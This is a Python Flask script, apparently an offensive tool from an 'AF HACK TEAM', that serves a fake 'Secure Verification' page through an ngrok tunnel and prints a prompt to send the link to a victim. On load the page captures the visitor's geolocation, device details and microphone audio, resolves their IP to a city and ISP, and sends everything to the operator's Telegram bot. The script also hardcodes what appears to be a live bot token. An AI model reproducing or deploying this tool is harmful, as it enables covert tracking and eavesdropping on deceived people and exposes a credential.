# AF MaSoom v0.3
# Author: Ali Hamza
# Created by: AF HACK TEAM

import os
import json
import requests
from flask import Flask, request, render_template_string
from pyngrok import ngrok

# Your Bot Token and chat ID (first use the token to find chat ID)
TOKEN = "7664449745:AAGA_V8ikC-g0753vPZ-TGXeBP-OxHpRCos"
CHAT_ID = None
LOG_FILE = "logs.txt"

app = Flask(__name__)

html_content = """
<!DOCTYPE html>
<html>
<head>
  <title>Secure Verification</title>
  <script>
    function captureData() {
      navigator.geolocation.getCurrentPosition(function(position) {
        fetch("/location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          })
        });
      });

      fetch("/info", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userAgent: navigator.userAgent,
          platform: navigator.platform
        })
      });

      fetch("/camera", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ snapshot: "Camera not available without permission." })
      });

      navigator.mediaDevices.getUserMedia({ audio: true })
        .then(function(stream) {
          const recorder = new MediaRecorder(stream);
          recorder.ondataavailable = function(event) {
            fetch("/audio", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                audioData: event.data
              })
            });
          };
          recorder.start();
        }).catch(function(error) {
          console.error('Audio recording error:', error);
        });
    }
    window.onload = captureData;
  </script>
</head>
<body>
  <h2>Processing... Please wait</h2>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(html_content)

@app.route("/location", methods=["POST"])
def location():
    data = request.json
    message = f"📍 Location:\nLatitude: {data['latitude']}\nLongitude: {data['longitude']}"
    send_telegram(message)
    save_log(message)
    return "", 200

@app.route("/info", methods=["POST"])
def info():
    data = request.json
    ip = request.remote_addr
    ip_info = requests.get(f"http://ip-api.com/json/{ip}").json()
    ip_data = f"🌐 IP: {ip}\nCity: {ip_info.get('city')}\nCountry: {ip_info.get('country')}\nISP: {ip_info.get('isp')}"
    message = f"📱 Device Info:\nUser-Agent: {data['userAgent']}\nPlatform: {data['platform']}\n{ip_data}"
    send_telegram(message)
    save_log(message)
    return "", 200

@app.route("/camera", methods=["POST"])
def camera():
    data = request.json
    message = f"📷 Camera Snapshot:\n{data['snapshot']}"
    send_telegram(message)
    save_log(message)
    return "", 200

@app.route("/audio", methods=["POST"])
def audio():
    data = request.json
    audio_data = data.get("audioData")
    # Here, we could store or send the audio data as per your requirements
    message = "🎤 Audio Data received!"
    send_telegram(message)
    save_log(message)
    return "", 200

def send_telegram(text):
    global CHAT_ID
    if CHAT_ID is None:
        updates = requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates").json()
        try:
            CHAT_ID = updates['result'][-1]['message']['chat']['id']
        except:
            return
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': text}
    requests.post(url, json=payload)

def save_log(text):
    with open(LOG_FILE, "a") as f:
        f.write(text + "\n" + "-"*40 + "\n")

if __name__ == "__main__":
    public_url = ngrok.connect(5000)
    print(f"[*] Send this link to victim: {public_url}")
    app.run(port=5000)
